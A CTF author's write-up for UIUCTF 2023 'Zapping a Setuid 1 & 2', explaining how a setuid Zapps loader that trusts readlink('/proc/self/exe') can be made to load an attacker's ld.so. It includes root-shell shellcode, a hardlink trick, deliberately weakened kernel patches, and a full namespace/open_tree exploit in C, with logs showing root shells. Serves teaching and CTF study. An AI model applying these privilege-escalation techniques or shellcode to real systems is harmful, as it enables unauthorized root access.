# Zapping a Setuid 1 & 2

by YiFei Zhu

This challenge explores how you could trick the `readlink("/proc/self/exe")`
syscall.

> Zapping a Setuid 1
>
> I was reading [how Zapps work](https://zapps.app/technology/) the other day
> and I thought I could [do better](https://github.com/warptools/ldshim/issues/1).
> However, what happens when a setuid was zapped?
>
> `$ socat file:$(tty),raw,echo=0 tcp:zapp-setuid-1.chal.uiuc.tf:1337`
>
> Hint: Oops I left [CVE-2009-0876](https://bugs.gentoo.org/260331) open.

> Zapping a Setuid 2
>
> Ok ok ok, but what if there was another way?
>
> `$ socat file:$(tty),raw,echo=0 tcp:zapp-setuid-2.chal.uiuc.tf:1337`
>
> Hint 1: The "zapps" symlink is for accessibility. The intended solution does not
> depend on the symlink.
>
> Hint 2: The additional patches to this challenge are hints.

## Background

It was end of last year (2022) and beginning of this year (2023) when I was sent
a link to the Zapps technology. I was asked for my thoughts, and I thought it
was cool, but I felt the extra execve was so unnecessary, since nothing prevents
an ELF executable from loading its own loader. I won't go through the details
of how it works exactly here, since all the discussion and description happened
in the linked GitHub issue.

When all was done and I sent the code, I started thinking about the possibility
of using Zapps as a setuid. If it's secure, then I'd need to prove it. If it's
not secure, then I could make it into a UIUCTF challenge.

Turns out, it is neither - it's simply unusable.

## $ORIGIN and AT_SECURE

When exec of a binary causes setuid (or file capability), the Linux kernel
[sets](https://elixir.bootlin.com/linux/v6.3.8/source/security/commoncap.c#L970)
`AT_SECURE` in the auxiliary vector. This has many consequences; of which the
most well known is that the dynamic loader will ignore `LD_PRELOAD` and
`LD_LIBRARY_PATH` environment variables.

It turns out, rpath will also be affected if it's using `$ORIGIN`. I checked
musl and glibc:
* musl - Will [simply ignore rpath](https://elixir.bootlin.com/musl/v1.2.4/source/ldso/dynlink.c#L918)
* glibc - Now [this is interesting](https://elixir.bootlin.com/glibc/glibc-2.37.9000/source/elf/dl-load.c#L297).
It will perform the expansion, but then discard the result if the result is
considered "not trusted". "Trusted" being rooted in one of the trusted
directories such as /usr/lib.

Since Zapps is dependent on rpath having `$ORIGIN`, this means, Zapps can only
setuid if it is linked with glibc instead of musl, and only if the Zapps is put
inside a trusted location such as `/usr/lib`. This is too restricting of a
limitation for Zapps I believe.

But why is this restriction here in the first place? To quote musl:
> $ORIGIN searches cannot be performed for the main program
> when it is suid/sgid/AT_SECURE. This is because the
> pathname is under the control of the caller of execve.

How would I gain control of the pathname? Because if I could fool the result
of `readlink("/proc/self/exe")`, and not implement the check of AT_SECURE into
the Zapps loader that loads `ld.so`, we have the chal. If I could make the
readlink return a path that I control, I can make it load and execute a
malicious `ld.so`.

## Ideas

### Hardlink

A hardlink is an alias for an inode. The owner and mode (including setuid bits)
of a file is stored in the inode. This means, when a hardlink is created for a
file, it is similar to moving the file and having the same owner and setuid,
just without removing the original.

Traditionally, creating a hardlink is creating a "directory entry" pointing to
the inode. Creating a "directory entry" is writing to the directory, so the only
required permission is the write permission on the directory itself. And... this
is exactly what we need! We create a hardlink in the directory we control, to
the Zapps setuid executable, which preserves the setuid, and then write our own
ld.so with our shellcode into the same directory, and the executable would just
load our ld.so and gice us a root shell, right?

This is basically a variant of the vulnerability in the hint, CVE-2009-0876.
This became the intended solution for Zapping a Setuid 1.

(Un)fortunately, the Linux kernel did additional hardening since then.
`fs.protected_hardlinks` sysctl was added in kernel 3.6, which would prevent
an unprivileged user from creating such a hardlink to a setuid binary they
don't own.

### Buffer overflow on readlink syscall

Did you know that `PATH_MAX` [isn't what most people think](https://insanecoding.blogspot.com/2007/11/pathmax-simply-isnt.html)? A path from
readlink can be longer than `PATH_MAX`.

In [my original implementation](https://github.com/zhuyifei1999/zapps-poc/commit/d77250967283fda8d224a34ca9a9f4903a8172ed):
```C
char ld[PATH_MAX];

if (_zapps_sys_readlink((char []){"/proc/self/exe"}, ld, sizeof(ld)) < 0)
    _zapps_die("Zapps: Fatal: failed to readlink /proc/self/exe\n");
```

A quick look at [the implementation of readlink](https://elixir.bootlin.com/linux/v6.3.8/source/fs/namei.c#L4973)
suggests the returned path could get truncated. However, further testing shows
that, at least in this instance, it would cause -ENAMETOOLONG:
* `do_proc_readlink` uses a buffer of `PATH_MAX`: https://elixir.bootlin.com/linux/v6.3.8/source/fs/proc/base.c#L1773
* ... which would return -ENAMETOOLONG if buffer is exhausted: https://elixir.bootlin.com/linux/v6.3.8/source/fs/d_path.c#L22

As far as Zapps is concerned, `_zapps_sys_readlink` will fail and `_zapps_die`
will happen.

This path is not really exploitable and even if it is... it defeats the purpose
of showing what `PATH_MAX` isn't.

### Racing the readlink syscall

What if the player is able to move the directory containing Zapps? If user owns,
say, /usr/lib/foo, then they could move `/usr/lib/foo/zapps/` into
`/usr/lib/foo/bar/` (they cannot move the zapps directory out of
`/usr/lib/foo/` because that requires write on `/usr/lib/foo/zapps/` in order to
update `/usr/lib/foo/zapps/..` link).

If the move happens after the readlink, but before the open syscall on `ld.so`,
then it would work in theory.

I did not go with this route because this is extremely tight of a race condition
(need to win two `rename` syscalls between the two syscalls of `readlink` and
`open` that Zapps invokes). This also requires a writable directory inside
`/usr/lib`, which I'm not a fan of. And exploiting non-deterministic race
conditions in general is just not very fun, not to mention being almost
impossible to healthcheck with a solve script.

### Namespaces, namespaces, namespaces

What if... one could constrict a user namespace + mount namespace, and modify
the mount table there. With bind mounts we can move the executable to a path we
control in the original namespace. After that is done, we can then open an fd
to the executable with O_PATH, send it back to the original namespace, and
`execveat` that file.

I like this approach, but it... didn't work. I hit
[a kernel hardening feature](https://github.com/torvalds/linux/commit/380cf5ba6b0a0b307f4afb62b186ca801defb203):
```diff
commit 380cf5ba6b0a0b307f4afb62b186ca801defb203
Author: Andy Lutomirski <luto@amacapital.net>
Date:   Thu Jun 23 16:41:05 2016 -0500

    fs: Treat foreign mounts as nosuid

    If a process gets access to a mount from a different user
    namespace, that process should not be able to take advantage of
    setuid files or selinux entrypoints from that filesystem.  Prevent
    this by treating mounts from other mount namespaces and those not
    owned by current_user_ns() or an ancestor as nosuid.

[...]
diff --git a/fs/exec.c b/fs/exec.c
index 887c1c955df8..ca239fc86d8d 100644
--- a/fs/exec.c
+++ b/fs/exec.c
@@ -1411,7 +1411,7 @@ static void bprm_fill_uid(struct linux_binprm *bprm)
        bprm->cred->euid = current_euid();
        bprm->cred->egid = current_egid();

-       if (bprm->file->f_path.mnt->mnt_flags & MNT_NOSUID)
+       if (!mnt_may_suid(bprm->file->f_path.mnt))
                return;

        if (task_no_new_privs(current))
diff --git a/fs/namespace.c b/fs/namespace.c
index 9786a38d1681..aabe8e397fc3 100644
--- a/fs/namespace.c
+++ b/fs/namespace.c
@@ -3280,6 +3280,19 @@ static bool mount_too_revealing(struct vfsmount *mnt, int *new_mnt_flags)
        return !mnt_already_visible(ns, mnt, new_mnt_flags);
 }

+bool mnt_may_suid(struct vfsmount *mnt)
+{
+       /*
+        * Foreign mounts (accessed via fchdir or through /proc
+        * symlinks) are always treated as if they are nosuid.  This
+        * prevents namespaces from trusting potentially unsafe
+        * suid/sgid bits, file caps, or security labels that originate
+        * in other namespaces.
+        */
+       return !(mnt->mnt_flags & MNT_NOSUID) && check_mnt(real_mount(mnt)) &&
+              current_in_userns(mnt->mnt_sb->s_user_ns);
+}
+
[...]
```

Hmph. I don't want to simply remove this check, because I think that's a bit too
easy. What if I try to satisfy these constraints by cloning it into the current
namespace with `open_tree`?Hmm....

Turns out, `open_tree` refuses to be called from unprivileged user, and also
refuses to clone between different mount namespaces. I had to remove those
checks. These resulted in these two patches:

```diff
diff --git a/fs/namespace.c b/fs/namespace.c
index df137ba19d37..4f520f800dbc 100644
--- a/fs/namespace.c
+++ b/fs/namespace.c
@@ -2527,9 +2527,6 @@ SYSCALL_DEFINE3(open_tree, int, dfd, const char __user *, filename, unsigned, fl
 	if (flags & AT_EMPTY_PATH)
 		lookup_flags |= LOOKUP_EMPTY;

-	if (detached && !may_mount())
-		return -EPERM;
-
 	fd = get_unused_fd_flags(flags & O_CLOEXEC);
 	if (fd < 0)
 		return fd;
```
```diff
diff --git a/fs/namespace.c b/fs/namespace.c
index 4f520f800dbc..eb196f016e3f 100644
--- a/fs/namespace.c
+++ b/fs/namespace.c
@@ -2396,9 +2396,6 @@ static struct mount *__do_loopback(struct path *old_path, int recurse)
 	if (IS_MNT_UNBINDABLE(old))
 		return mnt;

-	if (!check_mnt(old) && old_path->dentry->d_op != &ns_dentry_operations)
-		return mnt;
-
 	if (!recurse && has_locked_children(old, old_path->dentry))
 		return mnt;

```

And I was surprised to learn it *still* didn't work. Turns out, `open_tree`
clones into an [anonymous temporary mount namespace](https://elixir.bootlin.com/linux/v6.3.8/source/fs/namespace.c#L2470).
I had to, instead of checking if the current process is in the target
mount namespace (`check_mnt(real_mount(mnt))`), check if the current process is
in the user namespace that owns the target namespace
(`current_in_userns(real_mount(mnt)->mnt_ns->user_ns)`). This results in the
third patch:
```diff
diff --git a/fs/namespace.c b/fs/namespace.c
index eb196f016e3f..25757327a82a 100644
--- a/fs/namespace.c
+++ b/fs/namespace.c
@@ -4609,7 +4609,8 @@ bool mnt_may_suid(struct vfsmount *mnt)
 	 * suid/sgid bits, file caps, or security labels that originate
 	 * in other namespaces.
 	 */
-	return !(mnt->mnt_flags & MNT_NOSUID) && check_mnt(real_mount(mnt)) &&
+	return !(mnt->mnt_flags & MNT_NOSUID) &&
+	       current_in_userns(real_mount(mnt)->mnt_ns->user_ns) &&
 	       current_in_userns(mnt->mnt_sb->s_user_ns);
 }

```

This finally worked, and I think at least one of these patches is the kernel
being overly cautious and should not be needed in the first place.

The code path enabled by these patches became the intended solution for
Zapping a Setuid 2. I like this approach a lot because it gives an opportunity
for players to learn about this undocumented `open_tree` syscall and learn more
about Linux namespaces.

## Exploit

The shellcode used was slightly modified from standard shellcode, in that
* It provides an argv - because the VM runs busybox which uses argv0 to
distinguish the applet.
* calls `setuid(0)` syscall - to set RUID = EUID, otherwise the shell would
reset EUID back to unprivileged user, because file setuid only affects EUID.

```
.globl _start
.section .text,"ax",@progbits
.type _start, @function
_start:
.cfi_startproc
    xor %rdi,%rdi
    mov $105,%al
    syscall
    xor %rsi,%rsi
    push %rsi
    mov $0x6873612f2f2f2f2f,%rsi
    push %rsi
    push %rsp
    pop %rdi
    xor %rsi,%rsi
    push %rsi
    push %rdi
    push %rsp
    pop %rsi
    xor %rdx,%rdx
    push %rdx
    mov $0x68732f2f6e69622f,%rdi
    push %rdi
    push %rsp
    pop %rdi
    mov $59,%al
    cdq
    syscall
.cfi_endproc
```

Zapping a Setuid 1: setting the hardlink suffice:
```
$ socat file:$(tty),raw,echo=0 tcp:zapp-setuid-1.chal.uiuc.tf:1337
== proof-of-work: disabled ==
+ mount -n -t proc -o nosuid,noexec,nodev proc /proc/
+ mount -n -o remount,rw /
+ mkdir -p /dev /sys /etc
+ mount -n -t sysfs -o nosuid,noexec,nodev sys /sys
+ mount -n -t tmpfs -o mode=1777 tmpfs /tmp
+ mount -n -t 9p flag -o nosuid,noexec,nodev,version=9p2000.L,trans=virtio,msize=104857600,access=0 /mnt
+ cd /home/user
+ exec setsid bash -l
uiuctf-2023:/home/user# ./init_chal zapp-setuid-1
+ case "$1" in
+ rm -r virophage virophage.c am-i-not-root am-i-not-root.c
+ ln -s /usr/lib/zapps zapps
+ sysctl -w fs.protected_hardlinks=0
fs.protected_hardlinks = 0
uiuctf-2023:/home/user# exec setpriv --init-groups --reset-env --reuid user --regid user bash -l
uiuctf-2023:~$ vi payload.S
uiuctf-2023:~$ gcc -o ld-linux-x86-64.so.2 -static-pie -nostartfiles -Wl,--gc-sections payload.S
uiuctf-2023:~$ ln zapps/build/exe exe
uiuctf-2023:~$ ./exe
/home/user # cat /mnt/flag
uiuctf{did-you-see-why-its-in-usr-lib-now-0cd5fb56}
```

The flag is a reference to the protection in glibc.

Zapping a Setuid 2: do the namespace dance, where the child in its namespace modify the mount tree, and have the mount tree cloned by the parent which
execveat into the modified mount tree. The send/recv fd via `SCM_RIGHTS` isn't
necessary; there are simpler ways to do it, such as with `/proc/<pid>/fd` but
I already had the code ready with `SCM_RIGHTS` and didn't bother simplifying.

exploit.c:
```C
// SPDX-License-Identifier: Apache-2.0
/*
 * Copyright 2023 Google LLC.
 */

#define _GNU_SOURCE

#include <errno.h>
#include <fcntl.h>
#include <linux/mount.h>
#include <sched.h>
#include <stdarg.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mount.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <unistd.h>

#ifndef error
__attribute__((weak))
void error(int status, int errnum, const char *format, ...)
{
        va_list ap;

        fprintf(stderr, "%s: ", program_invocation_name);
        va_start(ap, format);
        vfprintf(stderr, format, ap);
        va_end(ap);
        if (errnum) {
                errno = errnum;
                fprintf(stderr, ": %m");
        }
        fprintf(stderr, "\n");

        if (status)
                exit(status);
}
#endif

static void send_fd(int sock, int fd)
{
        struct msghdr msg = {};
        struct cmsghdr *cmsg;
        char buf[CMSG_SPACE(sizeof(int))] = {0}, c = 'c';
        struct iovec io = {
                .iov_base = &c,
                .iov_len = 1,
        };

        msg.msg_iov = &io;
        msg.msg_iovlen = 1;
        msg.msg_control = buf;
        msg.msg_controllen = sizeof(buf);
        cmsg = CMSG_FIRSTHDR(&msg);
        cmsg->cmsg_level = SOL_SOCKET;
        cmsg->cmsg_type = SCM_RIGHTS;
        cmsg->cmsg_len = CMSG_LEN(sizeof(int));
        *((int *)CMSG_DATA(cmsg)) = fd;
        msg.msg_controllen = cmsg->cmsg_len;

        if (sendmsg(sock, &msg, 0) < 0)
                error(1, errno, "sendmsg");
}

static int recv_fd(int sock)
{
        struct msghdr msg = {};
        struct cmsghdr *cmsg;
        char buf[CMSG_SPACE(sizeof(int))] = {0}, c = 'c';
        struct iovec io = {
                .iov_base = &c,
                .iov_len = 1,
        };

        msg.msg_iov = &io;
        msg.msg_iovlen = 1;
        msg.msg_control = buf;
        msg.msg_controllen = sizeof(buf);

        if (recvmsg(sock, &msg, 0) < 0)
                error(1, errno, "recvmsg");

        for (cmsg = CMSG_FIRSTHDR(&msg); cmsg != NULL;
             cmsg = CMSG_NXTHDR(&msg, cmsg)) {
                if (cmsg->cmsg_level == SOL_SOCKET &&
                    cmsg->cmsg_type == SCM_RIGHTS &&
                    cmsg->cmsg_len == CMSG_LEN(sizeof(int))) {
                        int fd;
                        memcpy(&fd, CMSG_DATA(cmsg), sizeof(int));
                        return fd;
                }
        }

        error(1, errno, "recv_fd: no fds received");
        __builtin_unreachable();
}

static void do_child(int sock)
{
        int fd;

        if (unshare(CLONE_NEWUSER | CLONE_NEWNS) < 0)
                error(1, errno, "unshare(CLONE_NEWUSER | CLONE_NEWNS)");
        if (mount("none", "/", NULL, MS_REC | MS_PRIVATE, NULL) < 0)
                error(1, errno, "mount(/, MS_REC | MS_PRIVATE)");
        if (mount("/usr/lib/zapps/build", "/home/user", NULL, MS_BIND, NULL))
                error(1, errno, "mount(/home/user, MS_BIND)");

        fd = open("/", O_PATH);
        if (fd < 0)
                error(1, errno, "open(/, O_PATH)");

        send_fd(sock, fd);
        pause();
        _exit(0);
}

int main(void)
{
        int pair[2];
        pid_t child;
        int fd;

        if (socketpair(AF_UNIX, SOCK_DGRAM | SOCK_CLOEXEC, 0, pair) < 0)
                error(1, errno, "socketpair");

        child = fork();
        if (child < 0)
                error(1, errno, "fork");
        if (!child)
                do_child(pair[1]);

        fd = recv_fd(pair[0]);

        fd = syscall(SYS_open_tree, fd, "", AT_EMPTY_PATH | AT_RECURSIVE |
                     OPEN_TREE_CLONE);
        if (fd < 0)
                error(1, errno, "open_tree");

        syscall(SYS_execveat, fd, "home/user/exe", NULL, NULL, 0);
        error(1, errno, "execveat");
}
```

```
$ socat file:$(tty),raw,echo=0 tcp:zapp-setuid-2.chal.uiuc.tf:1337
== proof-of-work: disabled ==
+ mount -n -t proc -o nosuid,noexec,nodev proc /proc/
+ mount -n -o remount,rw /
+ mkdir -p /dev /sys /etc
+ mount -n -t sysfs -o nosuid,noexec,nodev sys /sys
+ mount -n -t tmpfs -o mode=1777 tmpfs /tmp
+ mount -n -t 9p flag -o nosuid,noexec,nodev,version=9p2000.L,trans=virtio,msize=104857600,access=0 /mnt
+ cd /home/user
+ exec setsid bash -l
uiuctf-2023:/home/user# ./init_chal zapp-setuid-2
+ case "$1" in
+ rm -r virophage virophage.c am-i-not-root am-i-not-root.c
+ ln -s /usr/lib/zapps zapps
+ sysctl -w fs.protected_hardlinks=1
fs.protected_hardlinks = 1
uiuctf-2023:/home/user# exec setpriv --init-groups --reset-env --reuid user --regid user bash -l
uiuctf-2023:~$ vi payload.S
uiuctf-2023:~$ gcc -o ld-linux-x86-64.so.2 -static-pie -nostartfiles -Wl,--gc-sections payload.S
uiuctf-2023:~$ vi exploit.c
uiuctf-2023:~$ gcc -o exploit exploit.c
uiuctf-2023:~$ ./exploit
/home/user # cat /mnt/flag
uiuctf{is-kernel-being-overly-cautious-5ba2e5c4}
```

The flag is a reference to how many additional patches I needed to make this
work. Some patches are for protections I am unsure why they are there in the
first place. Ideally I have less patches so they aren't as much of hints.
